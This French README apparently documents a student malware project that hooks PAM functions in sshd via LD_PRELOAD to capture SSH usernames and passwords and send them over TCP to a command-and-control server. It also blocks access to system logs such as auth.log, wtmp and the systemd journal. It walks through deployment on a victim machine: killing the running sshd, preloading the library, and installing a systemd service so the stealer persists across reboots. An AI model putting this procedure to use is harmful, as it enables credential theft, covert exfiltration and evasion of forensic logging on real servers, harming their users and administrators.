Projet de Malware utilisant LD_PRELOAD

Description :

Ce projet consiste en la création d'un malware en C qui intercepte les fonctions d'authentification SSH pour capturer les identifiants des utilisateurs. Il utilise la technique de LD_PRELOAD pour surcharger les fonctions de la bibliothèque PAM (Pluggable Authentication Modules) et ainsi intercepter les appels aux fonctions d'authentification. Les identifiants capturés sont ensuite envoyés à un serveur de Commande et Contrôle (C2) pour un suivi centralisé.

Fonctionnalités :

 - Interception des fonctions pam_get_user et pam_get_item pour capturer les noms d'utilisateur et les mots de passe.
 - Envoi des identifiants capturés à un serveur C2 via une connexion TCP.
 - Blocage de l'accès à certains fichiers sensibles en surchargeant les fonctions open, openat et fopen.

Fichiers du projet
 - pam_auth_logger.c : Contient le code du malware pour intercepter les fonctions PAM et envoyer les identifiants au serveur C2.
 - block_files.c : Contient le code pour bloquer l'accès à certains fichiers en surchargeant les fonctions de la bibliothèque standard C.
 - Makefile : Script de compilation pour générer la bibliothèque partagée libpam_auth_logger.so.
 - srv_tcp.c : Code du serveur C2 qui reçoit et enregistre les identifiants envoyés par le malware.

Compilation :

Dans un premier temps faites un git clone du projet :

Allez dans le dossier ou vous souhaitez copier le projet puis faite un :

 -  git clone https://github.com/snipzr/Partiel_C.git

Pour compiler le projet, exécutez la commande suivante :

make (Cette commande génère le fichier libpam_auth_logger.so)


Sur le C2 faite aussi un git clone puis pour compiler le serveur TCP, utilisez la commande suivante :

 - gcc -o srv_tcp srv_tcp.c

Utilisation
Démarrage du serveur C2 :

Sur le C2, lancez le serveur TCP :

 - ./srv_tcp

Déploiement du malware sur la machine victime (avec droit root pour la partie ssh) :

D'abord l'on vas s'occuper de la partie ssh puis ensuite de la partie qui bloque l'accès au fichiers suivants :

1.Fichiers de logs systèmes

/var/log/wtmp
/var/log/lastlog
/var/log/btmp
/var/log/auth.log
/var/log/sysstat

2.Journaux de systemd

/var/log/journal

3.Logs liés à l'affichage graphique

Toute occurrence contenant "Xorg." (exemple : /var/log/Xorg.0.log)


MISE EN PLACE

( Pensez a changez l'adresse IP du C2 par celle de votre C2dans le pam_auth_logger.c à la ligne : 129 sinon les crédentials ne s'enveront pas)

dans le dossier Partiel_C compilez les fichiers nécessaires en utilisant la commande :

make (utilisable grace au Makefile qui compilera le malware) 

Assurez-vous que le port 22 n'est pas utilisé par un autre processus :

Utilisez la commande suivante pour lister les processus en écoute sur le port 22 :

 - sudo lsof -i :22

notez le PID (2eme colone)

Arreter le processus qui utilise le port :

 - sudo kill -9 <PID>

Vérifier que le port 22 a été libéré

 - sudo netstat -tuln | grep ":22"


Ensuite créez le répertoire /run/sshd :

sudo mkdir -p /run/sshd
sudo chmod 0755 /run/sshd

Testez manuellement le chargement de la bibliothèque avec LD_PRELOAD :

LD_PRELOAD=/chemin/vers/libpam_auth_logger.so /usr/sbin/sshd -D

Puis tentez de vous connecter en ssh via une machine lambda ppour verifier que le C2 recoit bien les crédentials

Si tout fonctionne correctement, créez un service systemd pour automatiser le démarrage :

sudo vim /etc/systemd/system/ld_preload_sshd.service
Ajoutez le contenu suivant :

[Unit]
Description=SSH Daemon with LD_PRELOAD
After=network.target

[Service]
Environment="LD_PRELOAD=/chemin/vers/libpam_auth_logger.so"
ExecStart=/usr/sbin/sshd -D
Restart=on-failure
RestartSec=5s
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
Remplacez /chemin/vers/libpam_auth_logger.so par le chemin réel vers le fichier.

Rechargez les unités systemd et activez le service :

sudo systemctl daemon-reload
sudo systemctl enable ld_preload_sshd
sudo systemctl start ld_preload_sshd
sudo systemctl status ld_preload_sshd

Ainsi le Malware sera lancé a chaque démarage de la machine 


EXPLICATION :


Fonctionnement de LD_PRELOAD

LD_PRELOAD est une variable d'environnement utilisée sur les systèmes Unix pour spécifier des bibliothèques partagées à charger avant les autres lors de l'exécution d'un programme. Cela permet de surcharger des fonctions spécifiques, offrant ainsi la possibilité de modifier le comportement d'applications sans changer leur code source.

Dans ce projet, LD_PRELOAD nous permet d'intercepter les appels aux fonctions PAM sans modifier le code source du démon SSH. En utilisant cette technique, nous chargeons la bibliothèque libpam_auth_logger.so avant les autres bibliothèques système. Cela redéfinit des fonctions comme pam_get_user et pam_get_item pour capturer les identifiants utilisateur, qui sont ensuite transmis au serveur C2. L'approche par LD_PRELOAD est discrète et évite de nécessiter des droits root, ce qui est en phase avec les objectifs du projet.


Fonctionnement d'un Linker

Un linker, ou éditeur de liens, est un outil qui combine divers modules de code objet en un seul exécutable ou une bibliothèque. Il résout les références entre les symboles (fonctions, variables) définis dans différents modules, permettant ainsi à un programme de fonctionner correctement.

Dans le contexte de LD_PRELOAD, le linker dynamique (ld.so sur les systèmes Linux) joue un rôle clé en redirigeant les appels système vers nos fonctions redéfinies. Lorsque notre bibliothèque est chargée, le linker garantit que les appels aux fonctions PAM (par exemple, pam_get_user) passent par nos définitions personnalisées. Cette redirection est ce qui permet d'intercepter les credentials sans modifier directement les fichiers binaires du démon SSH.


Fonctionnement des Threads sur Linux

Un thread est une unité d'exécution au sein d'un processus. Les threads partagent le même espace mémoire et les mêmes ressources, mais peuvent être exécutés indépendamment, permettant une exécution parallèle au sein d'une application.

Dans ce projet, les threads pourraient être utilisés pour gérer plusieurs connexions simultanément entre les machines infectées et le serveur C2. Par exemple, chaque fois que des credentials sont capturés et transmis, un thread distinct pourrait gérer l'envoi au serveur C2, tout en permettant au malware de continuer à fonctionner en arrière-plan. Cela garantit une exécution fluide et rapide des tâches sans bloquer le système.
